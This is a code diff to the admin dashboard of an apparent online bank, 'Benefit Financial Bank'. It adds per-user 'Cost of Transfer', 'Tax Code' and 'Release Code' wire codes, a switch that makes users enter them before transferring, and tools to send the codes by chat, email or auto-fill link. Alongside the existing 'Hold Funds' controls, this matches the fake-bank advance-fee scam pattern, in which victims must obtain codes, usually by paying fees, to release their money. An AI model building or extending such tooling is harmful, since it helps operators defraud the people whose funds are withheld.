@@ -222,6 +222,10 @@ body{font-family:'Inter',sans-serif;background:#0b1120;color:#e2e8f0;min-height:
         <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
         All Users
       </a>
+      <a class="nav-item" onclick="openWireSettingsModal()" href="#" title="Configurewire transfer codes for any user">
+        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><circle cx="12" cy="12" r="4"/></svg>
+        Wire Codes
+      </a>
 
       <div class="nav-section">Approvals</div>
       <a class="nav-item" onclick="showSection('deposits')" href="#">
@@ -366,6 +370,11 @@ body{font-family:'Inter',sans-serif;background:#0b1120;color:#e2e8f0;min-height:
       <div class="section" id="section-users">
         <div class="section-title">User Management</div>
         <div class="section-sub">Click any user to manage their account, funds, and status.</div>
+        <div class="alert-banner" id="wire-settings-alert" style="display:flex;align-items:center;gap:10px;background:#0a1f3a;border:1px solid #1e3a5f;border-left:4px solid #2563eb;color:#93c5fd;border-radius:10px;padding:12px 16px;margin-bottom:14px;font-size:13px;line-height:1.5">
+          <span class="alert-icon">🌐</span>
+          <span style="flex:1" id="wire-settings-alert-text">Configure the International Wire codes for all users.</span>
+          <button class="btn btn-primary btn-sm" onclick="openWireSettingsModal()">Configure</button>
+        </div>
         <div class="alert-banner" id="users-alert">
           <span class="alert-icon">⚠️</span>
           <span id="users-alert-text"></span>
@@ -470,7 +479,8 @@ body{font-family:'Inter',sans-serif;background:#0b1120;color:#e2e8f0;min-height:
                   <div style="color:#e2e8f0;font-weight:700;font-size:14px" id="lc-user-name">User</div>
                   <div style="color:#64748b;font-size:12px" id="lc-user-email"></div>
                 </div>
-                <div style="margin-left:auto;display:flex;gap:8px">
+                <div style="margin-left:auto;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+                  <button class="btn btn-success btn-sm" id="lc-wire-btn" onclick="sendWireCodeChat()" style="display:none" title="Send the selected user's International Wire codes in this chat">🌐 Share Wire Codes</button>
                   <select id="lc-status-sel" class="search-box" style="width:130px;font-size:12px" onchange="updateLcStatus()">
                     <option value="open">Open</option>
                     <option value="pending">Pending</option>
@@ -679,10 +689,8 @@ body{font-family:'Inter',sans-serif;background:#0b1120;color:#e2e8f0;min-height:
         <button class="btn btn-warning" onclick="openHoldModal()">🔒 Hold Funds</button>
         <button class="btn btn-ghost" onclick="openReleaseModal()">🔓 Release Hold</button>
         <button class="btn btn-ghost" onclick="openTxnHistory()">📋 Transactions</button>
-      </div>
-
-      <div class="action-grid" style="margin-top:10px">
-        <button class="btn btn-primary" onclick="openMessageModal()">✉️ Send Message</button>
+        <button class="btn btn-primary" onclick="openWireSettingsModalForUser()">🌐 Wire Codes</button>
+        <button class="btn btn-ghost" onclick="openMessageModal()">✉️ Send Message</button>
       </div>
 
       <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center">
@@ -858,6 +866,56 @@ body{font-family:'Inter',sans-serif;background:#0b1120;color:#e2e8f0;min-height:
   </div>
 </div>
 
+<!-- Wire Settings Modal -->
+<div class="modal-overlay" id="modal-wire-settings">
+  <div class="modal" style="max-width:580px">
+    <div class="modal-header"><div class="modal-title">🌐 International Wire Codes</div><button class="modal-close" onclick="closeModal('modal-wire-settings')">✕</button></div>
+    <div class="modal-body">
+      <div class="alert alert-err" id="ws-err"></div>
+      <div class="alert alert-ok" id="ws-ok" style="display:none"></div>
+      <div class="info-note" id="ws-note" style="display:none;background:#0a1f3a;border:1px solid #1e3a5f;color:#93c5fd">Enable any of the three International Wire requirements below — the transfer only needs codes for the toggles that are <strong>ON</strong>. Each code is generated per user and can be shared via Live Chat or Email.</div>
+      <div class="form-group"><label class="form-label">Global On/Off</label>
+        <select class="form-select" id="ws-enabled" onchange="renderWireSettingsState()">
+          <option value="true">ON — users must enter required wire codes</option>
+          <option value="false">OFF — wire codes disabled (normal transfer flow)</option>
+        </select>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:16px">
+        <div class="wire-toggle" data-key="cost" style="background:#0b1120;border:1.5px solid #1e2d4a;border-radius:12px;padding:14px;cursor:pointer" onclick="toggleWireReq('cost')">
+          <div style="font-size:22px;text-align:center">💸</div>
+          <div style="font-size:13px;font-weight:700;color:#e2e8f0;text-align:center;margin-top:6px">Cost of Transfer</div>
+          <div style="text-align:center;margin-top:8px"><span id="ws-req-cost" class="badge badge-inactive">OFF</span></div>
+        </div>
+        <div class="wire-toggle" data-key="tax" style="background:#0b1120;border:1.5px solid #1e2d4a;border-radius:12px;padding:14px;cursor:pointer" onclick="toggleWireReq('tax')">
+          <div style="font-size:22px;text-align:center">🧾</div>
+          <div style="font-size:13px;font-weight:700;color:#e2e8f0;text-align:center;margin-top:6px">Tax Code</div>
+          <div style="text-align:center;margin-top:8px"><span id="ws-req-tax" class="badge badge-inactive">OFF</span></div>
+        </div>
+        <div class="wire-toggle" data-key="release" style="background:#0b1120;border:1.5px solid #1e2d4a;border-radius:12px;padding:14px;cursor:pointer" onclick="toggleWireReq('release')">
+          <div style="font-size:22px;text-align:center">🔓</div>
+          <div style="font-size:13px;font-weight:700;color:#e2e8f0;text-align:center;margin-top:6px">Release Code</div>
+          <div style="text-align:center;margin-top:8px"><span id="ws-req-release" class="badge badge-inactive">OFF</span></div>
+        </div>
+      </div>
+      <div class="info-note" id="ws-codes-note" style="display:none">When a code is required, the user will be asked to enter it on their dashboard before the transfer is submitted. The codes below are unique to this user; share them via Live Chat or Email below.</div>
+      <div class="form-group"><label class="form-label">Cost of Transfer Code</label><input class="form-input" type="text" id="ws-cost-code" placeholder="e.g. CRC-4829-11"></div>
+      <div class="form-group"><label class="form-label">Tax Code</label><input class="form-input" type="text" id="ws-tax-code" placeholder="e.g. TAX-2201-77"></div>
+      <div class="form-group"><label class="form-label">Release Code</label><input class="form-input" type="text" id="ws-release-code" placeholder="e.g. RLS-9934-20"></div>
+      <div style="display:flex;gap:8px;flex-wrap:wrap">
+        <button class="btn btn-primary" onclick="saveWireSettings()">Save Codes</button>
+        <button class="btn btn-ghost" onclick="generateWireCodes()">🔁 Regenerate</button>
+        <button class="btn btn-ghost" onclick="sendWireCodeEmail()">✉️ Email Codes</button>
+        <button class="btn btn-success" onclick="sendWireCodeChat()">💬 Send via Chat</button>
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-ghost" onclick="closeModal('modal-wire-settings')">Cancel</button>
+      <button class="btn btn-primary" onclick="saveWireSettings()" id="ws-save-btn">Save Codes</button>
+      <button class="btn btn-ghost" onclick="copyWireCodesLink()">🔗 Copy Link</button>
+    </div>
+  </div>
+</div>
+
 <!-- Read Email Modal -->
 <div class="modal-overlay" id="modal-email-read">
   <div class="modal">
@@ -888,6 +946,166 @@ function walletShort(){return WALLET_ADDRESS.slice(0,6)+'…'+WALLET_ADDRESS.sli
 
 function esc(s){ s = (s===null||s===undefined)?'':String(s); return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
 
+// ── International Wire codes ────────────────────────────
+const WIRE_DEFAULTS = { enabled:false, cost:'', tax:'', release:'' }
+function wireLabel(k) { return k == 'cost' ? 'Cost of Transfer' : k == 'tax' ? 'Tax Code' : 'Release Code' }
+function wireGen(k) {
+const pre = k == 'cost' ? 'CRC' : k == 'tax' ? 'TAX' : 'RLS'
+const rn = function (len) { var s = ''; while (s.length < len) s += Math.floor(Math.random() * 10).toString() ; return s }
+return pre + '-' + rn(4) + '-' + rn(2)
+}
+function wireUserTarget() {
+if (selectedUserId) return selectedUserId
+if (lcSelectedId) {
+const t = lcSessions.find(x => x.id === lcSelectedId)
+if (t && t.user_id) return t.user_id
+}
+return null
+}
+async function wireLoad(who) {
+if (!who) return null
+if (wireCodesCache[who]) return wireCodesCache[who]
+const d = await sb.rpc('admin_get_wire_codes', { target_uid: who })
+if (d.error) { console.warn('admin_get_wire_codes:', d.error.message); return null }
+const wf = d.data || null
+const out = Object.assign({}, WIRE_DEFAULTS, (wf && wf.codes) ? wf.codes : {})
+wireCodesCache[who] = out
+return out
+}
+async function showWireSettings(targetUid) {
+const who = targetUid || wireUserTarget()
+if (!who) { showAlert('ws-err', 'Select a user first.'); return }
+selectedUserId = who
+const wf = await wireLoad(who)
+document.getElementById('ws-enabled').value = wf && wf.enabled ? 'true' : 'false'
+document.getElementById('ws-cost-code').value = (wf && wf.cost) || ''
+document.getElementById('ws-tax-code').value = (wf && wf.tax) || ''
+document.getElementById('ws-release-code').value = (wf && wf.release) || ''
+const u = allUsers.find(x => x.id === who) || {}
+const note = document.getElementById('ws-note')
+note.style.display = 'block'
+note.textContent = 'Codes for ' + (u.full_name || u.email || 'this user') + '。 Save assigns them; use Regenerate, Email, or Chat to share them with the user.'
+document.getElementById('ws-err').style.display = 'none'
+document.getElementById('ws-ok').style.display = 'none'
+renderWireSettingsState()
+openModal('modal-wire-settings')
+}
+function openWireSettingsModalForUser() { showWireSettings(selectedUserId) }
+function openWireSettingsModal() { showWireSettings(null) }
+function toggleWireReq(key) {
+const el = document.getElementById('ws-req-' + key)
+if (!el) return
+const on = el.classList.contains('badge-active')
+el.classList.toggle('badge-active')
+el.classList.toggle('badge-inactive')
+el.textContent = on ? 'OFF' : 'ON'
+}
+function renderWireSettingsState() {
+const enabled = document.getElementById('ws-enabled').value === 'true'
+['cost', 'tax', 'release'].forEach(function (key) {
+const el = document.getElementById('ws-req-' + key)
+if (!el) return
+if (!enabled) { el.classList.add('badge-inactive'); el.classList.remove('badge-active'); el.textContent = 'OFF' }
+else { el.classList.add('badge-active'); el.classList.remove('badge-inactive'); el.textContent = 'ON' }
+})
+}
+function wireCollectSettings() {
+if (!selectedUserId) { showAlert('ws-err', 'Select a user first.'); return null }
+const enabled = document.getElementById('ws-enabled').value === 'true'
+const cost = document.getElementById('ws-cost-code').value.trim()
+const tax = document.getElementById('ws-tax-code').value.trim()
+const release = document.getElementById('ws-release-code').value.trim()
+const require = { cost: document.getElementById('ws-req-cost').classList.contains('badge-active'), tax: document.getElementById('ws-req-tax').classList.contains('badge-active'), release: document.getElementById('ws-req-release').classList.contains('badge-active') }
+const codes = { enabled: enabled, cost: cost, tax: tax, release: release, require: require }
+wireCodesCache[selectedUserId] = codes
+return codes
+}
+async function saveWireSettings() {
+const codes = wireCollectSettings()
+if (!codes) return
+document.getElementById('ws-err').style.display = 'none'
+document.getElementById('ws-ok').style.display = 'none'
+const el = document.getElementById('ws-save-btn'); el.disabled = true; el.textContent = 'Saving...'
+const d = await sb.rpc('admin_set_wire_codes', { target_uid: selectedUserId, p_codes: codes })
+el.disabled = false; el.textContent = 'Save Codes'
+if (d.error) { showAlert('ws-err', d.error.message); return }
+if (d.data && d.data.created_at) {
+const any = codes.cost || codes.tax || codes.release
+if (codes.enabled && any) sendWireCodeEmailTo(selectedUserId, codes)
+}
+showAlert('ws-ok', 'Wire codes saved.')
+refreshUsersWireBanner()
+closeModal('modal-wire-settings')
+}
+function generateWireCodes() {
+if (!selectedUserId) { showAlert('ws-err', 'Select a user first.'); return }
+const anyReq = document.getElementById('ws-req-cost').classList.contains('badge-active') || document.getElementById('ws-req-tax').classList.contains('badge-active') || document.getElementById('ws-req-release').classList.contains('badge-active')
+if (document.getElementById('ws-enabled').value === 'true' && !anyReq) { ['cost','tax','release'].forEach(function (k) { const el = document.getElementById('ws-req-' + k); el.classList.add('badge-active'); el.classList.remove('badge-inactive'); el.textContent = 'ON' }) }
+document.getElementById('ws-cost-code').value = wireGen('cost')
+document.getElementById('ws-tax-code').value = wireGen('tax')
+document.getElementById('ws-release-code').value = wireGen('release')
+}
+function refreshUsersWireBanner() {
+const el = document.getElementById('wire-settings-alert-text')
+if (!el) return
+const on = Object.keys(wireCodesCache).filter(id => wireCodesCache[id] && wireCodesCache[id].enabled).length
+el.textContent = on ? on + ' user(s) currently require International Wire codes.' : 'Configure the International Wire codes for all users.'
+}
+function sendWireCodeChat() {
+const who = wireUserTarget()
+if (!who) { showAlert('ws-err', 'Select a user first.'); return }
+const wf = who ? wireCodesCache[who] : null
+if (!wf || !wf.enabled) { showAlert(lcSelectedId ? 'lc-err' : 'ws-err', 'Save and enable codes for this user first (currently OFF..'); return }
+const msg = 'Your International Wire codes are: Cost of Transfer: ' + (wf.cost || '—') + '; Tax Code: ' + (wf.tax || '—') + '; Release Code: ' + (wf.release || '—') + '.'
+if (lcSelectedId) { awaitSendLc(msg) } else { sendWireCodeEmailTo(who, wf) }
+}
+function sendWireCodeEmail() {
+if (!selectedUserId) return
+const wf = wireCodesCache[selectedUserId]
+if (!wf || !wf.enabled) { showAlert('ws-err', 'Enable and save codes first.'); return }
+sendWireCodeEmailTo(selectedUserId, wf)
+}
+function sendWireCodeEmailTo(who, codes) {
+if (!codes) return
+const body = 'Your international wire transfer codes are:\n\n'
++ '  • Cost of Transfer: ' + (codes.cost || '—') + '\n'
++ '  • Tax Code: ' + (codes.tax || '—') + '\n'
++ '  • Release Code: ' + (codes.release || '—') + '\n\n'
++ 'Keep these safe. You will need them when submitting an international wire from your dashboard.\n\n— Benefit Financial Bank Support'
+sb.rpc('admin_send_message', {
+  target_user: who,
+  p_subject: 'Your International Wire Codes',
+  p_body: body,
+  p_category: 'account'
+}).then(function () {
+showAlert('ws-ok', 'Wire codes emailed to the user.')
+loadEmail(true)
+}).catch(function (err) {
+showAlert('ws-err', 'Email failed: ' + (err && err.message || err))
+})
+}
+async function awaitSendLc(msg) {
+const input = document.getElementById('lc-reply-input')
+if (!input) return
+input.value = msg
+await sendLcReply()
+}
+
+function copyWireCodesLink() {
+if (!selectedUserId) { showAlert('ws-err', 'Select a user first.'); return }
+const wf = wireCodesCache[selectedUserId]
+if (!wf || !wf.enabled) { showAlert('ws-err', 'Enable and save codes first.'); return }
+const cost = encodeURIComponent(wf.cost || '')
+const tax = encodeURIComponent(wf.tax || '')
+const release = encodeURIComponent(wf.release || '')
+const url = location.origin + '/dashboard?wf=1&cost=' + cost + '&tax=' + tax + '&release=' + release + '&name=' + encodeURIComponent((allUsers.find(u => u.id === selectedUserId) || {}).email || '')
+navigator.clipboard.writeText(url).then(function () {
+showAlert('ws-ok', 'Link copied to clipboard. Send it to the user; they will tap it to auto-fill their International Wire codes.')
+}).catch(function () {
+showAlert('ws-err', 'Could not copy. Link: ' + url)
+})
+}
+
 let currentUser = null;
 let allUsers = [];
 let allTxns = [];
@@ -895,6 +1113,7 @@ let selectedUserId = null;
 let selectedTransferId = null;
 let selectedLoanId = null;
 let selectedTicketId = null;
+let wireCodesCache = {};
 
 // ── Init ──────────────────────────────────────────────
 async function init() {
